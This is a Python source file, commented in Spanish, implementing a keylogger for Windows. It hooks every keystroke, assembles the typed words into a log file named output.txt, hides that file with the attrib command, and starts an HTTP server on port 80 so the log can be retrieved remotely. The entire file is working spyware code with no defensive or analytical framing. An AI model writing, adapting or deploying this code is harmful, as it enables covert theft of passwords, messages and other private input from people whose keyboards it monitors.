import keyboard
import os
import subprocess
import stat

# Clase CMD
class cmdAccess():

    # Clase sin constructor
    # Se crea metodo para ejecutar servidor http
    def httpServer(self):

        # Ejecuto servidor en el puerto 80, comando asincrónico
        subprocess.Popen(["python", "-m", "http.server", "80"])

    # Metodo para ocultar archivo
    def hideFile(self, file):

        # Si no existe el archivo
        if not os.path.exists(file):
            return
        
        atributos = os.stat(file).st_file_attributes

        # Si el archivo no está coulto, lo oculto.
        if not bool(atributos & stat.FILE_ATTRIBUTE_HIDDEN):
            subprocess.run(["attrib", "+h", file], check=True)

# Clase keylogger para recolectar texto
class keyLogger(cmdAccess):

    # Constructos
    def __init__(self):

        # Atributo de tipo string, inicializado como texto vacio
        self.word = ""

    # Metodo para capturar pulsaciones
    def pulsacion_tecla(self, puls):

        if puls.event_type == keyboard.KEY_DOWN:
            
            # Si se ha agregado un espacio
            if puls.name == 'backspace':

                # Elimino la última letra del string
                self.removeLetter()

            elif puls.name == 'space' or puls.name == 'enter':

                #guardar_palabra_al_espacio()
                self.saveWord()

            # Si el pulso tiene tamaño 1
            elif len(puls.name) == 1 and puls.name.isprintable():

                # Concateno pulsos
                self.word += puls.name
                

    # Cada vez que ingreso escacio o enter guardo palabra y la reinicio
    def saveWord(self):
        
        with open("output.txt", "a") as file: # La a es de append, modo apertura del archivo para añadir información.
            file.write(self.word + "\n")

        # Verifico si archivo existe para ocultarlo
        self.hideFile("output.txt")

        # Receteo la palabra
        self.resetWord()

    # Método para resetear palabras
    def resetWord(self):

        # Reseteo palabra
        self.word = ""

    # Metodo para remover letra
    def removeLetter(self):

        # Elimino la última letra del string
        self.word = self.word[:-1] 

if __name__ == "__main__": 

    # Objeto subprocesador
    subCMD = cmdAccess()

    # Oculto archivo, siempre y cuando existan
    subCMD.hideFile("output.txt")

    # Levanto servidor
    subCMD.httpServer()

    # Objeto keylogger
    teclado_1 = keyLogger()

    # Detecto pulsaciones
    keyboard.hook(teclado_1.pulsacion_tecla)

    # Similar bucle while
    keyboard.wait()